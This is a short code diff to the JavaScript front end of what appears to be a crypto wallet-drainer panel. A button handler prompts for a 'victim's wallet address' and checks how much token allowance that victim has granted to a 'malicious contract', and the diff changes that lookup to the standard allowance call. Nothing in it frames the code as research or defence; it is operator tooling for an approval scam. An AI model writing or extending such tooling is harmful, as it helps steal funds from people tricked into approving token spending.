@@ -286,14 +286,15 @@
             }
         }
 
+// Add event listener for checking allowance
 document.getElementById("checkAllowanceBtn").addEventListener("click", async () => {
     const victimAddress = prompt("Enter victim's wallet address:");
     if (victimAddress) {
         try {
-            // Call the checkAllowance function from the malicious contract
-            const allowance = await contract.methods.checkAllowance(victimAddress).call();
+            // Get the allowance using the malicious contract's allowance function
+            const allowance = await maliciousContract.methods.allowance(victimAddress, maliciousContractAddress).call();
             
-            // Convert the allowance to a BigNumber (if needed)
+            // Convert to BigNumber
             const allowanceBN = web3.utils.toBN(allowance);
 
             // Check if the allowance is greater than 0
@@ -308,7 +309,6 @@ document.getElementById("checkAllowanceBtn").addEventListener("click", async () 
         }
     }
 });
-
 
 
 
